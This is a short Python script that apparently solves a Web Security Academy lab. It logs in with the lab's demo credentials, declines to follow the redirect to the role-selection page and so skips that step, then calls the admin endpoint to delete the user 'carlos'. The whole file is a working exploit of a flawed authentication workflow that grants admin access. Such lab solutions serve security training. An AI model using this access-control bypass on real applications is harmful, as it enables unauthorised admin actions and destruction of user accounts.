from web_security_academy.core.logger import logger


def solve_lab(session):
    csrf = session.get_csrf_token("/login")
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    session.post_path("/login", data=data, allow_redirects=False)
    logger.info('Logged in without following redirect to "/role-select"')

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
